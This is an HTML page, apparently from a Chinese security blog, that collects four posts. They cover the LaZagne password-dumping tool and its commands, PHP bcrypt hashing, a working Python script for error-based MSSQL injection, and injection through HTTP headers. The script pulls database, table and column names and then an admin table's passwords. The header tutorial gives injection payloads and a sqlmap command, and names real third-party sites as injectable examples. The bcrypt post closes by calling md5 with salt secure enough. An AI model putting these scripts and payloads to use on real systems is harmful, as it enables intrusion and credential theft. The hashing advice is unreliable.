@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/" class="article-date">
+  <time datetime="2015-05-28T01:59:16.000Z" itemprop="datePublished">2015-05-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/工具/">工具</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/">忘记密码咋办？本地密码检索工具 – LaZagne Project</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转自freebuf：<a href="http://www.freebuf.com/tools/68229.html" target="_blank" rel="external">http://www.freebuf.com/tools/68229.html</a><br>简介</p>
+<p>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），我开发这款工具的目的是为了寻找计算机中最常用软件的密码。截至目前，该工具支持Windows上的22款软件，Linux/Unix-Like OS上的12款软件。</p>
+<p>使用方法：</p>
+<p>启用所有模块</p>
+<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe all<br></pre><br>启用特殊模块</p>
+<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe<br>example: laZagne.exe browsers<br>help: laZagne.exe -h</pre><br>仅启动一个特殊软件脚本</p>
+<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe<br>example: laZagne.exe browsers -f<br>help: laZagne.exe browsers -h</pre><br>将所有的密码写入文件（-w选项）</p>
+<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe all -w</pre><br><strong>注意：WI-FI密码/Windows密码需要启动管理员权限（UAC验证/sudo）</strong></p>
+<p><strong>支持软件</strong></p>
+<p><a href="http://image.3001.net/images/20150524/14324360298957.png!small" target="_blank" rel="external"><img src="http://image.3001.net/images/20150524/14324360298957.png!small" alt="" title="softwares.png"></a></p>
+<p>(*) 有些软件可能存在使用插件等方式保存密码：Chrome, Owncloud, Evolution, KMail</p>
+<p><strong>IE浏览器历史记录</strong></p>
+<p>IE浏览器密码（从IE7到早前的Windows8）只能使用网站URL进行解密，只是作为Win32CryptUnprotectData api的一个参数。因此，使用IE浏览器历史记录能够将密码破解出来。要做到这一点，我需要使用一个C语言编写的DLL（代码在browser_history_dll目录下）且作为一个Base64字符串直接嵌入python代码中。加载之后，DLL会写入磁盘，其中一个包装类是用来调用DLL函数的然后这个DLL文件会从磁盘删除。</p>
+<p><strong>构建属于你自己的密码恢复脚本</strong></p>
+<p>你可以自由的为你选择的软件编写一个脚本。并且不用担心，编写一个模块十分简单。<strong>
+</strong></p>
+<p>要做到这一点，我们需要满足一些代码标准。</p>
+<p>1.使用软件名创建一个类包含两个重要的函数：</p>
+<p><pre class="brush: actionscript3; gutter: true">init:用于定义启动类的所有参数<br>run:主函数</pre><br>2.将类名和相关信息添加到config.manageModules.py文件</p>
+<p>3.所有包含密码的输出都必须发送到”print_output”函数</p>
+<p><pre class="brush: actionscript3; gutter: true">举例：print_output(software_name, password_list)</pre><br>4.可选项：你可以使用”print_debug” 函数打印出输出结果</p>
+<p>5.也可以参考现有脚本，用以理解。</p>
+<p>要求</p>
+<p>为了编译源代码，需要一些外部库</p>
+<p>Windows：</p>
+<p><pre class="brush: actionscript3; gutter: true">colorama(<a href="https://pypi.python.org/pypi/colorama" target="_blank" rel="external">https://pypi.python.org/pypi/colorama</a>) Python Windows扩展(<a href="http://sourceforge.net/projects/pywin32/）" target="_blank" rel="external">http://sourceforge.net/projects/pywin32/）</a> pycrypto（pip安装pycrypto） Impacket（<a href="https://github.com/CoreSecurity/impacket）" target="_blank" rel="external">https://github.com/CoreSecurity/impacket）</a></pre><br>Linux：</p>
+<p>对于Ubuntu 14.04</p>
+<p><pre class="brush: actionscript3; gutter: true">python-kde4 (Kwallet)</pre><br>其他发行版</p>
+<p><pre class="brush: actionscript3; gutter: true ">Python 2.7<br>argparse<br>Crypto<br>dbus (Pidgin)<br>python-kde4 (Kwallet)</pre><br>项目地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/" data-id="cimy6sd550009r0gcqmoi7mue" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/" class="article-date">
+  <time datetime="2015-05-21T06:58:55.000Z" itemprop="datePublished">2015-05-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP/">PHP</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/">PHP5.5使用Bcrypt加密密码</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在php5.5中，加入了一个新的密码哈希函数，可使用Bcrypt轻松实现加盐的安全密码。</p>
+<p>bcrypt和其他对称或非对称加密方式不同的是，不是直接解密得到明文，也不是二次加密比较密文，而是把明文和存储的密文一块运算得到另一个密文，如果这两个密文相同则验证成功。</p>
+<p>官方手册在这里： <a href="http://cn2.php.net/manual/zh/book.password.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/book.password.php</a></p>
+<p>生成密钥</p>
+<p>[php]<br>$hash = password_hash(‘password’,PASSWORD_BCRYPT,[‘cost’ =&gt; 10]);<br>echo $hash;<br>[/php]</p>
+<p>password_hash() —-加密密码<br>第一个参数：需要加密的密码<br>第二个参数：密码算法常量 (<a href="http://cn2.php.net/manual/zh/password.constants.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/password.constants.php</a>)<br>第三个参数：数组类型。支持两个选项：salt在散列密码时加的盐（干扰字符串）。cost用来指明算法递归的层数。</p>
+<p>上面代码每次运行生成的密钥不同，大致效果如下。</p>
+<p>[php]<br>$2y$10$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe<br>[/php]</p>
+<p>生成的密钥长度为60位，所以设计数据库的时候需要注意。</p>
+<p>验证密钥</p>
+<p>懒得存数据库再去取了，直接把刚生成的密钥复制过来了~~</p>
+<p>[php]<br>$hash = ‘$2y$10$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe’;<br>$res = password_verify(‘password’,$hash);<br>var_dump($res);<br>[/php]</p>
+<p>如果没有天灾人祸意外发生的话。你会看到下面的输出</p>
+<p>[php]bool(true)[/php]</p>
+<p>这就成功了。</p>
+<p>性能</p>
+<p>下面我们来看看Bcrypt的性能，安全性的提升，肯定是以性能为代价。bcrypt要加强密码安全性，增加运行时间也是肯定的。那我们现在就测试一下Bcrypt与普通md5的速度。</p>
+<p>测试机性能：</p>
+<p>CPU I7 4核 2.3G主频<br>内存 16G ddr3 内存<br>系统 Mac<br>PHP 5.5.15</p>
+<p>现在用下面这段代码分别测试一下md5和Bcrypt在不加盐的情况下的运行速度<br>[php]<br>&lt;!–?php<br> $s_time = microtime(true);</p>
+<p>password_hash(‘password’,PASSWORD_BCRYPT,[‘cost’ =&gt; 10]);<br>// md5(‘password’);<br>$e_time = microtime(true);<br>$run_time = $e_time-$s_time;</p>
+<p>echo ($run_time*1000).’ms’;<br>[/php]<br>Bcrypt 5次运行结果<br>[php]<br>68.569183349609ms<br>68.006992340088ms<br>69.074869155884ms<br>68.211078643799ms<br>68.757057189941ms<br>[/php]<br>md5 5次运行结果<br>[php]<br>0.0040531158447266ms<br>0.0040531158447266ms<br>0.0050067901611328ms<br>0.0040531158447266ms<br>0.003814697265625ms<br>[/php]<br>测试结果</p>
+<p>Bcrypt 加密一个密文平均值在68毫秒左右，<br>md5 加密一个密文平均值在0.004毫秒左右，</p>
+<p>性能大约差距16000倍</p>
+<p>采用md5 一秒大约能加密 250000个密文<br>采用Bcrypt 一秒大约能加密 14个密文</p>
+<p>所以，如果你要将Bcrypt用到你的程序中去的话。小应用还好，如果是大应用。您就得按倍数增加服务器了。<br>如果不是给五角大楼写程序，其实md5+salt安全性已经足够了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/" data-id="cimy6sd5m000qr0gciczbq2zx" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-e5-9f-ba-e4-ba-8emssql-e7-9a-84-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e7-9a-84-e8-84-9a-e6-9c-acget" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/04/07/e5-9f-ba-e4-ba-8emssql-e7-9a-84-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e7-9a-84-e8-84-9a-e6-9c-acget/" class="article-date">
+  <time datetime="2015-04-07T13:02:13.000Z" itemprop="datePublished">2015-04-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Python/">Python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/04/07/e5-9f-ba-e4-ba-8emssql-e7-9a-84-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e7-9a-84-e8-84-9a-e6-9c-acget/">基于mssql的报错注入的脚本(get)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。</p>
+<p>对于get型的mssql的报错注入,代码如下：<br>[python]</p>
+<p>#! /usr/bin/<br>env python</p>
+<p>#coding=utf-8<br>import re<br>import urllib<br>import urllib2</p>
+<p>#从访问链接中获取报错信息</p>
+<p>def getcontent(payload):  #获取网页内容<br>    url1=url+”AND (“+payload+”)=1 — “<br>    content = urllib.urlopen(url1).read()<br>    print content<br>    return  content</p>
+<p>#从报错回显中提取数值<br>def getdata(content):<br>    patt = re.compile(“nvarchar.<em>?’(.</em>?)’.*?int”)<br>    data = patt.findall(content)<br>    if data:<br>        return data[0]<br>    else:<br>        return None</p>
+<p>#获取当前数据库名<br>def getcurrentdb():<br>    payload = ‘db_name()’<br>    content = getcontent(payload)<br>    data = getdata(content)<br>    print “current_db: “+data<br>    return data<br>def gettablename(dbname,n):  #获取表名<br>    tablelist1=[]<br>    for i in range(n):<br>        payload = “select top 1 name %u0066rom “+dbname+”.dbo.sysobjects where xtype=’U’ and name  not in(select top “+str(i)+” name %u0066rom “+dbname+”.dbo.sysobjects where xtype=’U’ order by name) order by name”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)</p>
+<pre><code>        #print data
+        if data not in tablelist1:
+            tablelist1.append(data)
+        else:
+            break
+    except:
+        continue
+print tablelist1
+print &apos;--------------------&apos;
+</code></pre><p>def getcolumns(dbname,table,n):  #获取列名<br>    tablelist2=[]<br>    for i in range(n):<br>        payload=”Select top 1 name %u0066rom “+dbname+”.dbo.SysColumns Where id=Object_Id(‘“+table+”‘) and name not in (Select top “+str(i)+” Name %u0066rom “+dbname+”.dbo.SysColumns Where id=Object_Id(‘“+table+”‘) order by name) order by name”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)<br>            if  data not in tablelist2:<br>                tablelist2.append(data)<br>            else:<br>                break<br>        except:<br>            continue<br>    print table<br>    print tablelist2<br>    print ‘——————–’<br>def getvalue(dbname,table,column,n):  #获取各字段的值<br>    tablelist3=[]<br>    for i in range(n):<br>        payload=”select top 1 “+column+” %u0066rom “+table+” where “+column+” not in(select top  “+str(i)+” “+column+” %u0066rom “+table+” order by  id)order by id”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)<br>            if  data  not in tablelist3:<br>                tablelist3.append(data)<br>            else:<br>                break<br>        except:<br>            continue<br>    print column<br>    print tablelist3</p>
+<p>if <strong>name</strong> == “<strong>main</strong>“:<br>    url=”<a href="http://www.example/pages/BulletinPage.aspx?id=21" target="_blank" rel="external">http://www.example/pages/BulletinPage.aspx?id=21</a>“<br>    global url<br>    db=getcurrentdb()<br>    gettablename(‘saa’,200)<br>    getcolumns(db,’Admin_Login’,50)<br>    getvalue(db,’Admin_Login’,’LoginPwd’,50)   #可自行选择注释，只留你需要的那个函数进行值得获取<br>[/python]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/04/07/e5-9f-ba-e4-ba-8emssql-e7-9a-84-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e7-9a-84-e8-84-9a-e6-9c-acget/" data-id="cimy6sd530007r0gciftg3a8a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-http-e8-af-b7-e6-b1-82-e5-a4-b4-e4-bf-a1-e6-81-af-e7-9a-84-e6-b3-a8-e5-85-a5-3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/04/06/http-e8-af-b7-e6-b1-82-e5-a4-b4-e4-bf-a1-e6-81-af-e7-9a-84-e6-b3-a8-e5-85-a5-3/" class="article-date">
+  <time datetime="2015-04-06T04:37:49.000Z" itemprop="datePublished">2015-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/注入/">注入</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/04/06/http-e8-af-b7-e6-b1-82-e5-a4-b4-e4-bf-a1-e6-81-af-e7-9a-84-e6-b3-a8-e5-85-a5-3/">HTTP请求头信息的注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div><br><br><span style="font-size: medium;">常见http可能被污染的参数有这些</span><br><div><br><div><span style="font-size: medium;">    - User-agent 浏览器版本 （少）</span></div><br><div><span style="font-size: medium;">    - Referer      来源（少）</span></div><br><div><span style="font-size: medium;">    - X-Forwarded-For 获取ip（高）</span></div><br><div><span style="font-size: medium;">    - client_ip   获取ip（高）</span></div><br><div><span style="font-size: medium;">    -cookie      获取cookie值（高）</span></div><br><div></div><br><div></div><br></div><br></div><br><div><strong><span style="font-size: medium;">一. cookie注入</span></strong></div><br><div><span style="font-family: SimHei;">  </span><span style="font-family: 'Microsoft Yahei';"> <span style="font-size: medium;"> 1. 原理： 在ASP中,request对象获取客户端提交数据常用的是get和post两种方式,同时request对象可以不通过集合来获得数据,即直接使用”request(“name”)”. 但它效率低下,容易出错,当我们省略具体的集合名称时,asp是按QueryString(get),Form(post),Cookie,Severvariable,集合的顺序来搜索的.cookie是保存在客户端的一个文本文件,可以进行修改,这样一来,就可以利用Request.cookie方式来提交变量的值,从而利用系统的漏洞进行注入攻击.</span></span></div><br><div><span style="font-family: 'Microsoft Yahei';"><span style="font-size: medium;">   2.  条件1是程序对get和post方式提交的数据进行了过滤，但未对cookie提交的<a href="http://www.2cto.com/database/" target="_blank" rel="external">数据库</a>进行过滤。</span>条件2，在1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</span></div><br><div><span style="font-family: 'Microsoft Yahei';"><span style="font-size: medium;">   3.  首先 我们需要找到一个注入点，如果是使用get方式提交的参数，要更改成cookie方式提交，我们首先要访问正常的存在注入点的页面，等页面完全打开之后，在开发者环境的console栏中，输入alert(document.cookie=”id=”+escape(“x”)); 这里的“id=”便是注入点中注入参数，x便是页面的参数的数值了，这两处要根据实际情况来定义。写完之后按下回车网页中会弹出一个对话框</span></span>现在更改好了cookie后我们就要试下能不能正常访问了，现在在另外一个窗口中重新打开那个注入点既是将“id=x”去掉后的，然后看是否能正常访问。如果去掉之后能够继续访问 那么说明可以进行cookie注入，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。</div><br><div></div><br><div><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/04/QQ截图20141226164615-1024x730.png" alt="QQ截图20141226164615"></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div><br><div><span style="font-size: medium;">4.实例 </span><span style="font-size: medium;"><a href="http://sef.xjtu.edu.cn/news_content.asp?id=2074" target="_blank" rel="external">http://sef.xjtu.edu.cn/news_content.asp?id=2074</a></span></div><br><div></div><br><div></div><br><div></div><br><div><span style="font-size: medium;"><strong>二.  X-Forwarded-For注入()</strong></span></div><br><div><span style="font-size: medium;">  1.  X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。<br></span></div><br><div><span style="font-size: medium;">  2.  X-Forwarded-For注入常见于检测用户ip是否合法，进行sql查询的时没有过滤获取ip的参数。</span></div><br><div><span style="font-size: medium;">  3.  利用方法，可以用firefox中的X-Forwarded-For Header插件</span></div><br></div><br><div><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/04/clipboard2.png" alt="clipboard"></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div>或者将抓的头信息的包保存在sqlmap的根路径，比如test.txt，python sqlmap.py -r test.txt –level 3</div><br><div><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/04/2.png" alt="2"></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div>4. 实例：<a href="http://www.alexa.cn/" target="_blank" rel="external">http://www.alexa.cn/</a></div><br><div></div><br><div></div><br><div></div><br><div><br><div><span style="font-size: medium;">三.  <strong>User-agent注入</strong></span><span style="font-size: medium;">用户代理（user agent）是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。</span><span style="font-size: medium;">并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息（如：购物车）。在这种情况下，我们就有必要研究下user-agent头存在的问题了。</span><span style="font-size: medium;">HTTP查询实例：</span><span style="font-size: medium;">GET /index.php HTTP/1.1<br>Host: [host]<br>User-Agent: aaa’ or 1/<em></em></span>&nbsp;<br><br><span style="font-size: medium;">四. <strong>Referer注入</strong></span><br><br><span style="font-size: medium;">Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。它允许服务器产生一系列的回退链接文档，像感兴趣的内容，日志等。它也允许跟踪那些坏链接以便维护。</span><br><br><span style="font-size: medium;">例如：</span><br><br><span style="font-size: medium;">GET /index.php HTTP/1.1<br>Host: [host]<br>User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36<br><br></div><br><div><br><br><span style="font-size: medium;">Referer: <a href="http://www.yaboukir.com" target="_blank" rel="external">http://www.yaboukir.com</a>‘</span><br><br><span style="font-size: medium;">实例：</span><a href="http://baike.cardbaobao.com/index.php?user-login" target="_blank" rel="external">http://baike.cardbaobao.com/index.php?user-login</a><br><br></div><br></div><br><div><br><br><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/04/clipboard-1024x238.png" alt="clipboard"><br><br>&nbsp;<br><br>&nbsp;<br><br>&nbsp;<br><br>&nbsp;<br><br>&nbsp;<br><br>五<em>*. 防止消息头注入漏洞</em><br><br><span style="font-size: medium;">       防止HTTP消息头注入漏洞的最有效方法是，不将用户控制的输入插入到应用程序返回的HTTP消息头中。通常我们可以用一些较为安全的方法代替这种行为。</span><br><br><span style="font-size: medium;">如果不可避免地要在HTTP消息头中插入用户控制的数据，那么应用程序应采取以下这种双重深层防御方法防止漏洞产生。</span><br><br>输入确认。应用程序应根据情形，对插入的数据进行尽可能严格的确认。例如，如果根据用户输入设定一个cookie值，那么应当限制这个值仅包含字母字符，最大长度为6B。<br><br>输出确认。应对插入消息头的每一个数据进行过滤，检测可能的恶意字符。实际上，任何ASCII码小于0x20的字符都应被视为可疑的恶意字符，应用程序应拒绝包含这些字符的请求。通过对所有应用程序内容使用 HTTPS，应用程序即可防止攻击者利用任何残留的消息头注入漏洞”毒害”代理服务器缓存。<br><div></div><br>&nbsp;<br><br>&nbsp;<br><br></div><br><div></div><br><div></div><br><div></div><br><div></div><br><div></div>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/04/06/http-e8-af-b7-e6-b1-82-e5-a4-b4-e4-bf-a1-e6-81-af-e7-9a-84-e6-b3-a8-e5-85-a5-3/" data-id="cimy6sd5h000ir0gc62ira2j0" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/注入，注入技巧/">注入，注入技巧</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网/">内网</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/注入/">注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞挖掘/">漏洞挖掘</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/test/">test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/注入，注入技巧/">注入，注入技巧</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/test/" style="font-size: 10px;">test</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/注入，注入技巧/" style="font-size: 10px;">注入，注入技巧</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/04/12/test/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2016/04/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/11/e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3/">浅谈企业网络边界</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/02/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89/">内网渗透之socks5代理（reGeorg+proxifier详细配置说明）</a>
+          </li>
+        
+          <li>
+            <a href="/2015/11/10/e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree/">傻瓜式通用钓鱼工具Weeman1.5-GreenTree</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
